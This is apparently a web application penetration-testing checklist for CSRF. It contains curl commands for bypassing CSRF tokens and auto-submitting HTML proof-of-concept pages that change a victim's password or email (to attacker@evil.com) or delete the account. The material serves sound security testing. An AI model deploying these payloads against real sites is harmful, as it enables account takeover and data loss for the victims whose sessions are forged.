# Cross-Site Request Forgery (CSRF) Testing

## Objective

Identify state-changing endpoints that can be triggered from a third-party website using a victim's active session — allowing an attacker to perform unauthorized actions on behalf of the victim.

---

## 1. CSRF Pre-Conditions Checklist

Before testing, confirm all pre-conditions for CSRF exploitability:

| Condition | Check |
|---|---|
| The action has security relevance (password change, email change, transfer, delete) | Yes / No |
| Authentication is based on cookies (not custom headers or Bearer tokens) | Yes / No |
| The request can be forged from another origin (form POST, image tag, XMLHttpRequest) | Yes / No |
| No unpredictable CSRF token in request | Yes / No |
| No `SameSite=Strict` cookie attribute | Yes / No |

**If all Yes → CSRF exploitable.**
If authentication uses `Authorization: Bearer` header → CSRF is not applicable (cannot be set cross-origin).

---

## 2. CSRF Token Analysis

### Step 1 — Identify CSRF Token Presence
```bash
# Check HTML forms for CSRF tokens
curl -s https://target/profile/edit | grep -iE "csrf|token|nonce|_token"

# Check request headers
curl -si -X POST https://target/profile/edit \
  -H "Cookie: session=VALID_SESSION" \
  -d "email=test@test.com" | grep -iE "csrf|forbidden|invalid"
```

### Step 2 — Test CSRF Token Bypass Techniques

**a) Remove CSRF token entirely**
```bash
# Original request has _csrf=TOKEN — remove it
curl -si -X POST https://target/profile/update \
  -H "Cookie: session=VALID_SESSION" \
  -d "email=newemail@test.com" | grep HTTP
```

**b) Send empty CSRF token**
```bash
curl -si -X POST https://target/profile/update \
  -H "Cookie: session=VALID_SESSION" \
  -d "_csrf=&email=newemail@test.com" | grep HTTP
```

**c) Replace CSRF token with a known-good token from another session**
```bash
# Use CSRF token from attacker's own session
curl -si -X POST https://target/profile/update \
  -H "Cookie: session=VICTIM_SESSION" \
  -d "_csrf=ATTACKER_CSRF_TOKEN&email=newemail@test.com" | grep HTTP
```

**d) Change request method** (POST → GET)
```bash
curl -si "https://target/profile/update?email=newemail@test.com" \
  -H "Cookie: session=VALID_SESSION" | grep HTTP
```

**e) Change Content-Type to text/plain**
```bash
curl -si -X POST https://target/profile/update \
  -H "Cookie: session=VALID_SESSION" \
  -H "Content-Type: text/plain" \
  -d "_csrf=INVALID&email=newemail@test.com" | grep HTTP
```

---

## 3. SameSite Cookie Analysis

```bash
# Check SameSite attribute on session cookie
curl -si https://target/login \
  -d "username=user&password=pass" | grep -i "set-cookie"

# If SameSite=None;Secure → CSRF possible from cross-origin
# If SameSite=Lax → CSRF possible via top-level GET navigation
# If SameSite=Strict → CSRF effectively prevented
```

### SameSite=Lax Bypass
`Lax` only blocks cross-site requests for non-safe methods. Exploitable if:
- The vulnerable action accepts GET requests
- Cookies are newly issued (< 2 minutes old, Chrome's Lax+POST exception)

---

## 4. CSRF PoC Generation

### HTML Form-Based CSRF PoC
```html
<!-- Save as csrf_poc.html and open in browser while logged in to target -->
<html>
<body>
  <h1>CSRF PoC — Password Change</h1>
  <form id="csrfForm" action="https://TARGET/api/change-password" method="POST">
    <input type="hidden" name="new_password" value="Hacked@1234">
    <input type="hidden" name="confirm_password" value="Hacked@1234">
  </form>
  <script>document.getElementById('csrfForm').submit();</script>
</body>
</html>
```

### JSON Body CSRF PoC (text/plain trick)
```html
<html>
<body>
<form id="f" action="https://TARGET/api/change-email" method="POST"
      enctype="text/plain">
  <!-- text/plain CSRF: field name contains JSON prefix -->
  <input name='{"email":"hacked@attacker.com","ignore":"' value='"}'>
</form>
<script>f.submit();</script>
</body>
</html>
```

### Image Tag CSRF (GET-based state change)
```html
<!-- Exploits if a state change happens on GET -->
<img src="https://TARGET/api/delete-account?confirm=true">
```

### Fetch-Based CSRF (same-origin, cross-origin with CORS misconfiguration)
```html
<script>
fetch('https://TARGET/api/change-email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'email=attacker@evil.com'
})
</script>
```

---

## 5. CSRF on Critical Endpoints

Priority targets for CSRF testing:

| Endpoint | Action | Impact |
|---|---|---|
| /account/change-password | Password change | Account takeover |
| /account/change-email | Email change | Account takeover |
| /account/delete | Account deletion | Data loss |
| /account/add-admin | Add admin user | Privilege escalation |
| /payment/transfer | Fund transfer | Financial loss |
| /api/webhooks | Add webhook | Data exfiltration |
| /settings/connect-oauth | Link OAuth | Account linkage |
| /settings/2fa/disable | Disable MFA | Auth downgrade |

---

## Evidence to Capture

- The vulnerable endpoint (method, URL, parameter names)
- The CSRF PoC HTML file
- Before/after state showing the change was made
- Cookie flags (showing SameSite is not Strict)
- HTTP request showing no CSRF token or accepted invalid token

---

## Findings Reference

| Test | Result | Severity |
|---|---|---|
| No CSRF token on password change | Pass/Fail | High |
| CSRF token removed — accepted | Pass/Fail | High |
| CSRF token replaced — accepted | Pass/Fail | High |
| SameSite=None on session cookie | Pass/Fail | Medium (modifier) |
| GET-based state change | Pass/Fail | High |
| CSRF on account deletion | Pass/Fail | High |
